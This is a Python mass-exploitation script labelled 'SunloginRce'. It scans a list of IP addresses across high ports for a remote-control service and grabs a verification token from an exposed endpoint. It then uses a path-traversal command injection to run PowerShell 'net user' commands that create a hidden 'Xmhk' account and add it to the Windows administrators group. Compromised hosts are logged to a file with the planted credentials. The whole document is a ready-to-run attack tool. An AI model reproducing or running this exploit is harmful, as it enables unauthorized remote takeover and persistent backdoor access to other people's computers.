
# by Xmhk
# 2022-04-11
import os
import sys
import time
import requests
import re
import random
from colorama import Fore,init
from ctypes import windll
from tkinter import filedialog
from multiprocessing.dummy import Pool
import tkinter
from threading import Thread
import json
class Temp:
    hits = 0
    bad = 0

class Main:
    def __init__(self):
        self.threads = int(input("线程数:"))
        self.timeout = int(input("超时(S):"))
        #self.printbad = input("是否输出bad(1输出 2不输出):")
        while True:
            try:
                file = filedialog.askopenfilename(initialdir=(os.getcwd()), title='Select A IPS',
                                                  filetypes=(('txt files', '*.txt'),
                                                             ('all files', '*.*')))
                self.iplist = open(file, 'r', encoding='u8', errors='ignore').read().split('\n')
                break
            except:
                print(f"{Fore.LIGHTRED_EX}你没有选择ip")
                continue
        print(f"导入:{Fore.BLUE + str(len(self.iplist))}")
        if int(self.threads) > len(self.iplist):
            self.threads = len(self.iplist)
        Thread(target=self.title, daemon=True).start()
        pool = Pool(self.threads)
        res = pool.imap_unordered(func=self.task, iterable=self.iplist)
        oc = []
        for i in res:
            if i[0]:
                Temp.hits += 1
            else:
                Temp.bad += 1
        for t in oc:
            t.join()
        pool.close()
        os.system('pause')
        sys.exit()
    def task(self,line):
        try:
            for i in range(40000,65536):
                data = self.reg(line,i)
                #print(f"{line}:{i}")
                if data[0]:
                    #print(data[1])
                    data2 = self.setuser(token=data[1],url=data[2],port=data[3])
                    if data2[0]:
                        print(f"{Fore.GREEN}[Good][{line}:{i}] Token{data[1]}")
                        with open(f'Success.txt', 'a+') as f:
                            f.write(f'{line}:{i}|token:{data[1]} | user:Xmhk/pass:Xmnb123.\n')
                        return [True]
                    else:
                        print(f"{Fore.RED}[Bad][{line}:{i}]")
                else:
                    print(f"{Fore.RED}[Bad][{line}:{i}]")
            return [False]
        except:
            return [False]



    def reg(self,url,port):
        try:
            hedaer = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'
            }
            urla = f"http://{url}:{port}/cgi-bin/rpc?action=verify-haras"
            res = requests.get(urla,timeout=self.timeout,headers=hedaer)
            #print(res.text)
            if res.status_code == 200:
                if "verify_string" in res.text:
                    return [True,json.loads(res.text)["verify_string"],url,port]
                else:
                    return [False]
            else:
                return [False]
        except:
            return [False]

    def setuser(self,token,url,port):
        try:
            hedaer = {
                "Host": url+":"+str(port),
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0, no-cache",
                "pragma": "no-cache",
                "Cookie": "CID="+token
            }
            #print(f"{url}:{port}")
            urlc = f"http://{url}:{port}/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20net+user+Xmhk+Xmnb123.+/add"
            res = requests.get(urlc,timeout=self.timeout,headers=hedaer)
            #print(res.text,res.status_code)
            if res.status_code == 200:
                url2 = f"http://{url}:{port}/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20net+localgroup+administrators+Xmhk+/add"
                res2 = requests.get(url2, timeout=self.timeout,headers=hedaer)
                if res2.status_code == 200:
                    return [True]
                else:
                    return [False]
            else:
                return [False]
        except:
            #print("Failed")
            return [False]

    def title(self):
        while True:
            windll.kernel32.SetConsoleTitleW(f"(SunloginRce #by Xmhk) Success:{Temp.hits} Bad:{Temp.bad} Checked {Temp.hits + Temp.bad} of {len(self.iplist)}")


if __name__ == "__main__":
    init(autoreset=True)
    root = tkinter.Tk()
    root.withdraw()
    Main()